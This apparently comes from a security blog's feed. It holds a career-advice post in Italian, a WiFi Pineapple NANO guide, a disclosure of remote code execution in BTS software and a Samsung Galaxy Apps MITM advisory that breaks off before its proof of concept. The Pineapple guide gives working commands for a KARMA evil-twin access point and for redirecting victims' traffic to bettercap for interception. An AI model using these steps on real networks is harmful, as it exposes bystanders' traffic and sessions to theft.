&lt;p&gt;Since I work from home, most of the times I’m using the computer keyboard, not a smartphone, therefore I wanted/needed a console client for it, something that the vendor never released, so I started reversing the Android application in order to understand the communication protocol and write my own client implementation … guess what? :D&lt;/p&gt;
&lt;p&gt;Yep, i can make coffee using the terminal now :D&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/10/terminal.png&quot; alt=&quot;terminal&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
    
      <category term="hack" scheme="https://www.evilsocket.net/tags/hack/"/>
    
      <category term="hacking" scheme="https://www.evilsocket.net/tags/hacking/"/>
    
      <category term="coffee" scheme="https://www.evilsocket.net/tags/coffee/"/>
    
      <category term="nerd" scheme="https://www.evilsocket.net/tags/nerd/"/>
    
      <category term="smarter coffee" scheme="https://www.evilsocket.net/tags/smarter-coffee/"/>
    
      <category term="binary protocol" scheme="https://www.evilsocket.net/tags/binary-protocol/"/>
    
      <category term="reversed" scheme="https://www.evilsocket.net/tags/reversed/"/>
    
  </entry>
  
  <entry>
    <title>Un Po Di Consigli per Aspiranti Professionisti Del Settore Della Sicurezza Informatica</title>
    <link href="https://www.evilsocket.net/2016/10/02/Un-po-di-consigli-per-aspiranti-professionisti-del-settore-della-sicurezza-informatica/"/>
    <id>https://www.evilsocket.net/2016/10/02/Un-po-di-consigli-per-aspiranti-professionisti-del-settore-della-sicurezza-informatica/</id>
    <published>2016-10-02T16:39:08.000Z</published>
    <updated>2017-08-11T14:28:47.043Z</updated>
    
    <content type="html"><![CDATA[<p>Recentemente è stata pubblicata <a href="http://motherboard.vice.com/it/read/intervista-hacker-italiano-evilsocket" target="_blank" rel="external">una mia intervista</a> su Motherboard di VICE e appena qualche ora dopo ho iniziato a ricevere un quantitativo stupefacente di email da persone che chiedevano fondamentalmente tutte la stessa cosa, un po di consigli per aspiranti professionisti nel settore della sicurezza informatica.</p>
<p>Considerando che rispondere individualmente ad ogni email sarebbe poco fattibile ho allora deciso di scrivere un post nel quale raccogliere alcuni di questi consigli.<br>Se per alcuni di voi lettori dovessero sembrare delle banalità, mi scuso fin da subito, ma l’età di chi mi ha mandato quelle email è molto varia, così come il loro background professionale, quindi volerò abbastanza basso ed elencherò solo alcune delle basi.</p>
<p>Chiedo anche scusa fin da subito per gli errori di sintassi, grammatica e via dicendo. Non sono abituato a scrivere in Italiano, non sono abituato a scrivere cose non tecniche e soprattutto non sono uno scrittore :D</p>
<a id="more"></a>
<h3 id="Non-e-come-nei-film"><a href="#Non-e-come-nei-film" class="headerlink" title="Non è come nei film"></a>Non è come nei film</h3><p>Prima di tutto, mettetevi bene in testa questa cosa, lavorare nel mondo della sicurezza <strong>non è come nei film</strong>. Se vi siete interessati a questo percorso perchè “Matrix è figo” o perchè volete diventare come Elliot di Mr. Robot ( iniziate con la morfina se proprio dovete, poi ne riparliamo ), fidatevi che la cosa non fa per voi :D</p>
<p>Considerate questo scenario:</p>
<p>Lavorate sul vostro target ( che può essere il reversing di un applicazione, il pentest su la rete di un cliente, la scrittura di un exploit … qualsiasi cosa ) da giorni, e da altrettanti giorni praticamente non vi lavate. Siete incollati al computer da innumerevoli ore e vi staccate solo per andare al bagno e, quando proprio ne avete bisogno, dormire qualche ora. Avete consumato i vostri pasti davanti al computer usando una mano sola, anche il vostro animale domestico vi schifa per quanto puzzate e si sta facendo sempre più difficile trattenere quella pipì che sono almeno quattro ore che vi scappa … eppure continuate, quello schermo è tutto quello che vedete e sarà così finchè non avrete raggiunto il vostro obiettivo.</p>
<p>Se l’idea ( che ammetto essere un po esagerata, ma nemmeno tanto :D ) vi spaventa, o se pensate che non arrivereste mai a quel punto per quella che in fondo è “una scatola con uno schermo”, mi dispiace. Non volevo distruggere i vostri sogni, ma come vi avevo detto <strong>non è come nei film</strong>.</p>
<center><br><img src="/images/2016/10/social_life.jpg" alt="social life"><br></center>

<p>Se invece fate parte di quella “minoranza minorata” che vede questa situazione come accettabile e anzi, si fomenta solo al pensiero, trovatevi un bravo dottore! Ehm, volevo dire, benvenuti nel club :D</p>
<h3 id="Coltivate-la-vostra-Curiosita"><a href="#Coltivate-la-vostra-Curiosita" class="headerlink" title="Coltivate la vostra Curiosità"></a>Coltivate la vostra Curiosità</h3><p>Accettate fin da subito il fatto che <strong>studierete per la maggior parte della vostra vita</strong>.<br>Mai sentito dire “non si finisce mai di imparare” ? Beh, non avete la minima idea di quanto sia sacrosanto questo modo di dire nel mondo dell’informatica. Anche i più grandi professionisti di questo settore, anzi soprattutto loro, studiano costantemente nuove cose, imparano, assorbono e rielaborano.<br>Quindi va da se che se non siete <strong>curiosi</strong> per natura, se non vi chiedete il perchè di ogni cosa e non vi ostinate a studiare finchè non lo sapete, per voi sarà una vita veramente difficile e frustrante, perchè <strong>leggerete per memorizzare, non per capire</strong>. Quello che fate vi deve piacere e proprio tanto, solo a quel punto lo studio diventerà ricerca, le ore passate al computer saranno un investimento su voi stessi e i risultati inizieranno ad arrivare.</p>
<p>Coltivate la vostra curiosità, ponetevi delle domande, cercate (quasi morbosamente) le risposte e divertitevi mentre lo fate.</p>
<h3 id="Imparate-la-lingua-Inglese"><a href="#Imparate-la-lingua-Inglese" class="headerlink" title="Imparate la lingua Inglese"></a>Imparate la lingua Inglese</h3><p>Per quanto mi pare assurdo dover dare questo consiglio nel 2016, dalle email che ho ricevuto e per alcuni casi di persone che ho incontrato, ho capito che bisogna (ancora) farlo.</p>
<center><br><img src="/images/2016/10/renzi.jpg" alt="shish"><br></center>

<p>La stragrande maggioranza della documentazione tecnica è in inglese, i più importanti progetti open source sono commentati in inglese, alcuni dei libri migliori si trovano solo in inglese, cazzo perfino <a href="https://it.wikipedia.org/wiki/Alan_Turing" target="_blank" rel="external">Alan Turing</a> era inglese (se non capite il perchè di questa ultima frase, capitelo! ) … <strong>dovete imparare la lingua inglese</strong>, <em>face it</em>!</p>
<p>Non serve che componiate sonetti in inglese o che, fin da subito, sappiate intrattenere una conversazione con Bob che abita dall’altra parte del mondo, ma è fondamentale che sappiate <strong>cercare</strong> tra informazioni in inglese e, soprattutto, capirle quando le leggete.</p>
<p>Come si dice dalle mie parti, “mettetece ‘na pezza!” :D</p>
<h3 id="Imparate-ad-usare-Google"><a href="#Imparate-ad-usare-Google" class="headerlink" title="Imparate ad usare Google"></a>Imparate ad usare Google</h3><p>Ora che siete diventati <strong>curiosi</strong> e che avete <strong>imparato l’inglese</strong>, avete acquisito un buon 80% della capacità di districarvi tra il mare di informazioni della rete. Il restante 20% che vi manca consiste nell’imparare ad usare Google (o qualsiasi altro motore di ricerca degno di questo nome) che, per quanto possa sembrarvi banale, vi aprirà le porte di tutto ciò che mai vi potrà servire durante il vostro percorso tecnico/professionale.<br>Si dice che “non esistono domande stupide”, per quanto mi riguarda le domande stupide sono quelle che prima non hai fatto a Google.</p>
<p>Se non trovate la risposta alla vostra domanda, il più delle volte avete cercato male, <em>keep searching</em> ;)</p>
<h3 id="Studiate-le-basi-e-studiatele-ORA"><a href="#Studiate-le-basi-e-studiatele-ORA" class="headerlink" title="Studiate le basi e studiatele ORA"></a>Studiate le basi e studiatele ORA</h3><p>Il computer è uno strumento, i programmi che girano al suo interno sono strumenti, internet stessa è uno strumento e, come per ogni altro strumento, dovete imparare a capire come funzionano, a cosa servono i suoi vari pezzi, quando usarne uno piuttosto che un’altro e via dicendo.<br>Come la racchetta diventa l’estensione del braccio del tennista, dovete far diventare questi vostri strumenti un’estensione del vostro cervello e l’unico modo è capire come funzionano.</p>
<p>Per quanto non sono un fan dei libri tecnici e metto (quasi) sempre la pratica prima della teoria, ce ne sono molti che vi faranno risparmiare mesi, a volte anni, di ricerche nella rete tra informazioni sparpagliate.</p>
<p><a href="https://www.amazon.it/s/ref=sr_nr_p_lbr_books_authors__0?fst=as%3Aoff&amp;rh=n%3A411663031%2Ck%3Atanenbaum%2Cp_lbr_books_authors_browse-bin%3AAndrew+S.+Tanenbaum&amp;keywords=tanenbaum&amp;ie=UTF8&amp;qid=1475422166&amp;rnid=2150412031" target="_blank" rel="external">Buona lettura</a>.</p>
<p>E’ importante che cominciate fin da subito, le stesse identiche cose saranno più difficili da assorbire in futuro quando nella vostra testa ce ne saranno già un mare e con loro, a volte, delle nozioni sbagliate di come queste funzionino veramente.<br>Io ve lo dico, più andate avanti senza le basi, più probabilmente dovrete <strong>disimparare</strong> mentre le studiate.</p>
<h3 id="Imparate-almeno-due-linguaggi-di-programmazione"><a href="#Imparate-almeno-due-linguaggi-di-programmazione" class="headerlink" title="Imparate almeno due linguaggi di programmazione."></a>Imparate almeno due linguaggi di programmazione.</h3><p>Ci sono due scuole di pensiero in merito: c’è chi dice che la programmazione è fondamentale per entrare nel mondo della sicurezza e c’è invece chi dice che non serve necessariamente … io faccio parte della prima categoria.</p>
<p>Imparare a programmare un computer significa mettere finalmente in pratica quello che si ha imparato di come funziona, è “l’esercizio finale” che che unisce teoria e pratica … inoltre la programmazione si dimostrerà essere la migliore alleata, fidatevi! ;)</p>
<p>Iniziate con il <strong>C</strong> (o l’Assembly x86 se siete proprio masochisti), non tanto perchè dovete diventare degli assi con questo linguaggio, ma perchè è quello che, secondo la mia opinione, concilia meglio “il basso livello” (cioè come ragiona la macchina) con ”l’alto livello” (cioè come ragionate voi). Ha una sintassi che si può leggere senza avere attacchi epilettici ogni due righe eppure espone elegantemente i concetti di puntatore, stack, heap, allineamento della memoria e tutte queste cose carine che diventeranno il vostro pane se e quando inizierete a scrivere exploit, reversare un’applicazione, ecc :)</p>
<p>Oltre a farvi i pipponi mentali su come funziona un calcolatore, direi che è anche arrivata l’ora di piegarlo al vostro volere e fargli fare quello che volete voi, non trovate?<br>Ci sono operazioni che fate manualmente ogni giorno e che possono essere automatizzate, informazioni che possono essere trovate meglio e più velocemente, insomma, vi serve anche un <strong>linguaggio di scripting</strong>.</p>
<p>Qui potete scegliere tra <strong>Python</strong>, <strong>Ruby</strong> e compagnia bella, non fa molta differenza onestamente, c’è anche chi usa <strong>PHP</strong> come linguaggio di scripting da terminale. Per quanto questo possa sembrare bizzarro dato che il PHP storicamente è utilizzato quasi solo per applicazioni web, impararlo ed usarlo come <strong>primo</strong> (mi raccomando, il <strong>primo</strong>, non fermatevi al PHP se volete studiarlo) vostro “coltellino svizzero” sarebbe prendere due piccioni con una fava: starete imparando il vostro primo linguaggio di scripting <strong>e</strong> starete imparando come funziona un buon 90% delle applicazioni web che forse, un giorno, vi troverete a dover “penetrare”.</p>
<center><br>  <iframe width="560" height="315" src="https://www.youtube.com/embed/GmMXL6w-Y5A" frameborder="0" allowfullscreen></iframe><br></center>

<h3 id="Scrivete-e-o-studiate-delle-utilities-di-rete"><a href="#Scrivete-e-o-studiate-delle-utilities-di-rete" class="headerlink" title="Scrivete e/o studiate delle utilities di rete."></a>Scrivete e/o studiate delle utilities di rete.</h3><p>Come avrete già capito, il mio è un approccio atipico perchè è molto orientato alla pratica. Sono un forte sostenitore del concetto secondo il quale imparare qualcosa con la pratica sarà sempre più efficace che un approccio prettamente accademico/teorico, non è necessariamente il punto di vista giusto, ma quantomeno è quello che con me funziona meglio :)</p>
<p>Ora che avete capito come funziona un pc e che sapete programmarlo come vi pare, è arrivato il momento di capire come i vari pc comunicano tra loro usando la rete, quindi perchè non iniziare a scrivere la vostra prima utility di rete?</p>
<p>Se proprio non avete idee/fantasia, potete studiare il codice sorgente di cose come <strong>telnet</strong>, <strong>netcat</strong>, <strong>dig</strong>, <strong>wget</strong>, <strong>curl</strong> e chi più ne ha più ne metta. Le idee vi verranno, avrete voglia di migliorarli o modificarli per il vostro utilizzo specifico, inizierete a scrivere codice.</p>
<center><br><img src="/images/2016/10/oss.jpg" alt="open source"><br></center>

<h3 id="Non-Arrendetevi"><a href="#Non-Arrendetevi" class="headerlink" title="Non Arrendetevi"></a>Non Arrendetevi</h3><p>Intendiamoci, all’inizio ci saranno imprecazioni, un’alternanza di sensazioni tipo “o mio dio cosa sta succedendo a questo computer?!” e “io sono DIO!!!!”, tanti di quei bug da pagare una piccola nazione di programmatori per fixarli ma soprattutto <strong>momenti nei quali avrete voglia di mollare</strong>.<br>Non siete perfetti, il vostro codice non è perfetto e non lo sarà mai, il vostro cervello ha bisogno di tempo e metodo per assorbire tutte queste cose, accettatelo ma continuate comunque a perseguire quella perfezione, è questo il segreto ;)</p>
<center><br><img src="/images/2016/10/cat.jpg" alt="cat"><br></center>

<p>Sarete stupiti da quanto ancora possiate imparare indipendentemente dalla vostra età, condizione sociale o titolo di studio … dipende solo dalla vostra <strong>curiosità</strong> e <strong>tenacia</strong>.</p>
<h3 id="Fatto"><a href="#Fatto" class="headerlink" title="Fatto!"></a>Fatto!</h3><p>Ebbene si, abbiamo finito :)</p>
<p>Vi state chiedendo dove è la lista di “tool super segreti per hackerare ogni cosa”? O forse dove sono tutte quelle informazioni più specifiche sulla sicurezza?</p>
<p>Al di là del fatto che se avete più di dodici anni dovreste lavorare un po sulla vostra ingenuità ( :D ), la risposta a queste domande è anche la sintesi del mio ultimo consiglio: accettate il fatto che <strong>non ci sono scorciatoie</strong>.</p>
<center><br><img src="/images/2016/10/pill.jpg" alt="pill"><br></center>

<p>Non ci sono tutorial magici che vi faranno diventare “hacker in tre settimane”, neanche libri così completi da insegnarvi tutto quello che c’è da sapere. Dovrete imparare cercare, organizzare, gestire le informazioni e il vostro modo di assorbirle, questo richiede inevitabilmente tempo, dedizione e, come ho già abbondantemente detto, <strong>curiosità</strong>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Recentemente è stata pubblicata &lt;a href=&quot;http://motherboard.vice.com/it/read/intervista-hacker-italiano-evilsocket&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;una mia intervista&lt;/a&gt; su Motherboard di VICE e appena qualche ora dopo ho iniziato a ricevere un quantitativo stupefacente di email da persone che chiedevano fondamentalmente tutte la stessa cosa, un po di consigli per aspiranti professionisti nel settore della sicurezza informatica.&lt;/p&gt;
&lt;p&gt;Considerando che rispondere individualmente ad ogni email sarebbe poco fattibile ho allora deciso di scrivere un post nel quale raccogliere alcuni di questi consigli.&lt;br&gt;Se per alcuni di voi lettori dovessero sembrare delle banalità, mi scuso fin da subito, ma l’età di chi mi ha mandato quelle email è molto varia, così come il loro background professionale, quindi volerò abbastanza basso ed elencherò solo alcune delle basi.&lt;/p&gt;
&lt;p&gt;Chiedo anche scusa fin da subito per gli errori di sintassi, grammatica e via dicendo. Non sono abituato a scrivere in Italiano, non sono abituato a scrivere cose non tecniche e soprattutto non sono uno scrittore :D&lt;/p&gt;
    
    </summary>
    
    
      <category term="lavoro" scheme="https://www.evilsocket.net/tags/lavoro/"/>
    
      <category term="professione" scheme="https://www.evilsocket.net/tags/professione/"/>
    
      <category term="sicurezza informatica" scheme="https://www.evilsocket.net/tags/sicurezza-informatica/"/>
    
      <category term="consigli" scheme="https://www.evilsocket.net/tags/consigli/"/>
    
      <category term="informatica" scheme="https://www.evilsocket.net/tags/informatica/"/>
    
  </entry>
  
  <entry>
    <title>WiFi Pentesting With a Pineapple NANO, OS X and BetterCap</title>
    <link href="https://www.evilsocket.net/2016/09/15/WiFi-Pineapple-NANO-OS-X-and-BetterCap-setup/"/>
    <id>https://www.evilsocket.net/2016/09/15/WiFi-Pineapple-NANO-OS-X-and-BetterCap-setup/</id>
    <published>2016-09-15T12:48:23.000Z</published>
    <updated>2017-08-11T14:28:47.043Z</updated>
    
    <content type="html"><![CDATA[<p>After a few weeks of testing on the field, I’ve found the perfect configuration for WiFi pentesting using a WiFi Pineapple NANO, an OSX laptop and BetterCap.<br>Since different people from different forums had issues making this work ( mostly due to the difficulties of internet connection sharing between OSX and the Pineapple ) I’ve decided to share my setup today ^_^</p>
<center><br><img src="/images/2016/09/nano.jpg" alt="nano"><br></center>

<a id="more"></a>
<h3 id="WiFi-Pineapple-AKA-KARMA-attack-for-the-masses"><a href="#WiFi-Pineapple-AKA-KARMA-attack-for-the-masses" class="headerlink" title="WiFi Pineapple AKA KARMA attack for the masses"></a>WiFi Pineapple AKA KARMA attack for the masses</h3><p>First of all, let’s talk a little bit about the KARMA attack in case you have no idea what I’m talking about. <a href="https://digi.ninja/karma/" target="_blank" rel="external">DigiNinja</a> page on karma says:</p>
<pre><code>Karma is a set of patches to access point software to get it to respond to probe requests not just for itself but for any ESSID requested. This allows the AP to act as a lure to draw in any clients probing for known networks. The original Karma patches were released by Dino Dai Zovi for Madwifi, I then took over and ported the patches to Madwifi-ng and have now taken them to the new hostapd.
</code></pre><p>Long story short, on each WiFi access point there’s a demon running called <strong>hostapd</strong> which receives probes from nearby clients ( your laptop, mobile, etc ) and only responds to the probes that were sent to its SSID, discarding everything else.<br>Someone created a patched version of the hostapd binary which instead accepts <strong>every probe</strong>, this results in a WiFi access point that pretends to be (for instance) your home network thus <strong>forcing</strong> nearby devices to automatically connect to it.</p>
<p>You can create such kind of “Evil Twin” AP using a Kali distribution, the right drivers, the right hardware and so forth, or you can also <a href="https://penturalabs.wordpress.com/2013/04/25/blue-for-the-pineapple/" target="_blank" rel="external">hack a cheap TPLink WR703N</a>, but the easiest, quickest (and IMHO more stable) solution is buying a WiFi Pineapple from <a href="http://hakshop.myshopify.com/" target="_blank" rel="external">Hak5 online shop</a>.</p>
<p>In my case, I have a MKV, a Tetra and a NANO, in this post I’ll talk about the latter.</p>
<h3 id="Internet-Connection-Sharing-with-OS-X"><a href="#Internet-Connection-Sharing-with-OS-X" class="headerlink" title="Internet Connection Sharing with OS X"></a>Internet Connection Sharing with OS X</h3><p>Once you’ve done with the <a href="https://www.wifipineapple.com/pages/setup#nano" target="_blank" rel="external">basic NANO configuration</a>, you’ll have your device up and running with the ip address <em>172.16.42.1</em>, in order to share the connection from your Mac wifi adapter to the NANO ( which is plugged to the Mac’s USB port at this point ) you’ll need to change this ip address to a different one which eventually will be “accepted” by the ICS OS X mechanism, so:</p>
<pre><code>ssh root@172.16.42.1

uci set network.lan.ipaddr=&apos;192.168.2.10&apos;
uci set network.lan.gateway=&apos;192.168.2.1&apos;
uci commit &amp;&amp; reboot
</code></pre><p>You’ll then enable internet connection sharing from your Mac WiFi adapter to the NANO USB-Eth adapter:</p>
<center><br><img src="/images/2016/09/ics.png" alt="ics"><br></center>

<p>And eventually you’ll need to configure a static ip address for the interface:</p>
<center><br><img src="/images/2016/09/ip.png" alt="ip"><br></center>

<p>Almost done, you need to apply the correct firewall rules on your Mac to make everything work between the two interfaces, this is a bash script I’ve made ( in my case the NANO ethernet interface is <strong>en4</strong>, change it to your needs ):</p>
<pre><code>#!/bin/bash

if [ &quot;$(id -u)&quot; != &quot;0&quot; ]; then
   echo &quot;This script must be run as root.&quot; 1&gt;&amp;2
   exit 1
fi

sysctl -w net.inet.ip.forwarding=1
pfctl -e
echo &quot;nat on en0 from en4:network to any -&gt; (en0)&quot; | pfctl -f -
</code></pre><p>Once you’ve launched it, you can ssh again into your NANO and verify that the connection sharing is actually working.</p>
<center><br><img src="/images/2016/09/ics_working.png" alt="ics working"><br></center>

<p>Last step, just configure and start <strong>PineAP</strong> as you normally would:</p>
<center><br><img src="/images/2016/09/pineap.png" alt="pineap"><br></center>

<p>You now have your KARMA attack running and nearby WiFi enabled devices should start connecting to your evil AP very soon :)</p>
<h3 id="Port-Redirection-and-BetterCap"><a href="#Port-Redirection-and-BetterCap" class="headerlink" title="Port Redirection and BetterCap"></a>Port Redirection and BetterCap</h3><p>Unfortunately making bettercap run on the NANO is a <strong>pain in the ass</strong> and, even if you manage to do it, its hardware is simply not powerful enough to properly running it while handling multiple connections, so I’ve decided to run it on the laptop and have the NANO redirect all HTTP (and optionally HTTPS) traffic to it.</p>
<p>Here’s a simple bash script that you need to copy to your NANO, it will enable or disable port redirection to your bettercap instance running on the laptop:</p>
<pre><code>#!/bin/bash

if [[ $# -eq 0 ]] ; then
    echo &quot;Usage: $0 (enable|disable)&quot;
    exit 1
fi

action=&quot;$1&quot;
case $action in
    enable)
      echo &quot;Enabling ...&quot;
      iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(uci get network.lan.gateway):8080
      iptables -t nat -A POSTROUTING -j MASQUERADE
    ;;
    disable)
      echo &quot;Disabling ...&quot;
      iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(uci get network.lan.gateway):8080
    ;;
    *)
      echo &quot;Usage: $0 (enable|disable)&quot;
      exit 1
    ;;
esac
</code></pre><p>Once you’ve enabled port redirection, you can simply start bettercap on your laptop with your preferred command line and start intercepting the traffic of the target clients that have been forced to connect to your evil access point :D</p>
<center><br><img src="/images/2016/09/setup.jpg" alt="final setup"><br></center>

<p><strong>DONE! :D</strong> You won’t even need to MITM something, with this attack the targets will connect to you … enjoy! :)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;After a few weeks of testing on the field, I’ve found the perfect configuration for WiFi pentesting using a WiFi Pineapple NANO, an OSX laptop and BetterCap.&lt;br&gt;Since different people from different forums had issues making this work ( mostly due to the difficulties of internet connection sharing between OSX and the Pineapple ) I’ve decided to share my setup today ^_^&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/09/nano.jpg&quot; alt=&quot;nano&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="osx" scheme="https://www.evilsocket.net/tags/osx/"/>
    
      <category term="wifi pineapple" scheme="https://www.evilsocket.net/tags/wifi-pineapple/"/>
    
      <category term="wifi pentesting" scheme="https://www.evilsocket.net/tags/wifi-pentesting/"/>
    
      <category term="internet connection sharing" scheme="https://www.evilsocket.net/tags/internet-connection-sharing/"/>
    
      <category term="firewall" scheme="https://www.evilsocket.net/tags/firewall/"/>
    
      <category term="pineapple nano" scheme="https://www.evilsocket.net/tags/pineapple-nano/"/>
    
      <category term="setup" scheme="https://www.evilsocket.net/tags/setup/"/>
    
  </entry>
  
  <entry>
    <title>DISCLOSURE - RCE Against Every Open Source BTS Software.</title>
    <link href="https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/"/>
    <id>https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/</id>
    <published>2016-08-24T18:43:14.000Z</published>
    <updated>2017-08-11T14:28:47.039Z</updated>
    
    <content type="html"><![CDATA[<p>This is a repost of an analysis of mine that has been posted on Zimperium’s blog, basically I’ve found that the following products are vulnerable to remote command execution, plus other various logic errors n’ stuff:</p>
<ul>
<li>YateBTS &lt;= 5.0.0</li>
<li>OpenBTS &lt;= 4.0.0</li>
<li>OpenBTS-UMTS &lt;= 1.0.0</li>
<li>Osmo-TRX/Osmo-BTS &lt;= 0.1.10</li>
<li>Other products that share the same transceiver code base.</li>
</ul>
<center><br><img src="https://blog.zimperium.com/wp-content/uploads/2016/08/chart-1.png" alt="bts"><br></center>

<a id="more"></a>
<p>Long story short, they bind the transceiver server process to <code>INADDR_ANY</code> instead of <code>INADDR_LOOPBACK</code>, this makes it reachable by anyone on the same network (no authentication mechanism was implemented), moreover there’s an exploitable stack buffer overflow on the control socket, if you rely on both of this issues … well, you’ve got the idea :)</p>
<p>All details and the analysis itself <a href="https://blog.zimperium.com/analysis-of-multiple-vulnerabilities-in-different-open-source-bts-products/" target="_blank" rel="external">can be found here</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This is a repost of an analysis of mine that has been posted on Zimperium’s blog, basically I’ve found that the following products are vulnerable to remote command execution, plus other various logic errors n’ stuff:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;YateBTS &amp;lt;= 5.0.0&lt;/li&gt;
&lt;li&gt;OpenBTS &amp;lt;= 4.0.0&lt;/li&gt;
&lt;li&gt;OpenBTS-UMTS &amp;lt;= 1.0.0&lt;/li&gt;
&lt;li&gt;Osmo-TRX/Osmo-BTS &amp;lt;= 0.1.10&lt;/li&gt;
&lt;li&gt;Other products that share the same transceiver code base.&lt;/li&gt;
&lt;/ul&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;https://blog.zimperium.com/wp-content/uploads/2016/08/chart-1.png&quot; alt=&quot;bts&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="vulnerability" scheme="https://www.evilsocket.net/tags/vulnerability/"/>
    
      <category term="exploit" scheme="https://www.evilsocket.net/tags/exploit/"/>
    
      <category term="gsm" scheme="https://www.evilsocket.net/tags/gsm/"/>
    
      <category term="bts" scheme="https://www.evilsocket.net/tags/bts/"/>
    
      <category term="yatebts" scheme="https://www.evilsocket.net/tags/yatebts/"/>
    
      <category term="rce" scheme="https://www.evilsocket.net/tags/rce/"/>
    
      <category term="openbts" scheme="https://www.evilsocket.net/tags/openbts/"/>
    
      <category term="osmobb" scheme="https://www.evilsocket.net/tags/osmobb/"/>
    
      <category term="osmobts" scheme="https://www.evilsocket.net/tags/osmobts/"/>
    
      <category term="disclosure" scheme="https://www.evilsocket.net/tags/disclosure/"/>
    
  </entry>
  
  <entry>
    <title>Samsung Galaxy Apps MITM Vulnerabilities</title>
    <link href="https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/"/>
    <id>https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/</id>
    <published>2016-08-17T10:01:42.000Z</published>
    <updated>2017-08-11T14:28:47.043Z</updated>
    
    <content type="html"><![CDATA[<p>The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.</p>
<h4 id="Affected-Products"><a href="#Affected-Products" class="headerlink" title="Affected Products"></a>Affected Products</h4><p>Samsung Galaxy Apps &lt;= 4.1.01-14</p>
<center><br><img src="/images/2016/08/galaxyapps.png" alt="galaxy apps"><br></center>

<a id="more"></a>
<h2 id="MITM-Information-Leaks-and-Session-Hijacking"><a href="#MITM-Information-Leaks-and-Session-Hijacking" class="headerlink" title="MITM, Information Leaks and Session Hijacking"></a>MITM, Information Leaks and Session Hijacking</h2><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>Most of the application API requests are made through a unsafe HTTP connection which would allow a malicious third party to perform a network MITM attack and eventually exfiltrate user sensitive data such as his session identifier and subsequently use this data to impersonate the user session.</p>
<h4 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h4><p>The application relies on a XML based API used through HTTP, as soon as the user will open the app and start browsing a network attacker will be able to see requests sent to the API server and the user session data, for instance the first request being executed when the user clicks on an application detail page, identified by the name <strong>productDetailOverview</strong> is composed as shown in the following picture.</p>
<center><br><img src="/images/2016/08/productDetailOverview.png" alt="galaxy apps"><br></center>

<p>The XML response will contain application data such as the creation date, last update date, product name and description, etc.</p>
<p>It is possible to see that the user session cookies ( <strong>UUID</strong> and <strong>JSESSIONID</strong> ) are sent in cleartext, therefore they can be used by an attacker to impersonate the user and perform API requests on his behalf.</p>
<p>Other XML request names sent during application browsing and installation are:</p>
<ul>
<li><strong>bigBannerList</strong>, used to obtain application preview images.</li>
<li><strong>expertCommentList</strong> and commentList, these fetch comments for an app.</li>
<li><strong>productDetailRelated</strong>, fetches related applications list.</li>
<li><strong>categoryProductList2Notc</strong>, fetches products in the same category.</li>
<li><strong>sellerProductList2Notc</strong>, fetches other products of the same vendor.</li>
<li><strong>androidManifestList</strong>, fetches the list of permissions required by the application before installing it ( more on this later ).</li>
</ul>
<h4 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h4><ul>
<li>User Impersonation - An attacker could use the exfiltrated session data to authenticate against the API server on the user’s behalf.</li>
<li>Contents Manipulation - With a transparent proxy and proper redirection rules, an attacker could intercept and modify the XML responses before they’re received by the application, this would allow him to replace product images, names and descriptions with fake ones.</li>
</ul>
<h2 id="Permissions-Dialog-Bypass"><a href="#Permissions-Dialog-Bypass" class="headerlink" title="Permissions Dialog Bypass"></a>Permissions Dialog Bypass</h2><h4 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h4><p>It is possible for an attacker performing a MITM network attack to intercept and modify the XML response of the <strong>androidManifestList</strong> request and force the product to install an application without showing to the user the permission list dialog which would require his approval.</p>
<h4 id="Details-1"><a href="#Details-1" class="headerlink" title="Details"></a>Details</h4><p>Once the user clicks on the “Install” button, an <strong>androidManifestList</strong> request is sent to the API endpoint in order to fetch the list of permissions that the application requires:</p>
<center><br><img src="/images/2016/08/androidManifestList.png" alt="galaxy apps"><br></center>

<p>As shown in this picture, the response will contain the list of permissions separated by a double pipe ( “||” ) token.</p>
<p>This list is then splitted by the application and the user is prompted with a dialog which shows him the required permissions, the installation process requires the user to accept all of them in order to successfully continue.</p>
<center><br><img src="/images/2016/08/mail.png" alt="galaxy apps"><br></center>

<p>An attacker performing a MITM network attack can intercept and modify the XML response for this API before it’s sent to the device and replace the permissions list with a single <strong>INTERNET</strong> permission entry, in this case the Samsung Galaxy Apps store will directly install the application without showing the user any dialog at all.</p>
<p>The following is a POC bettercap proxy module.</p>
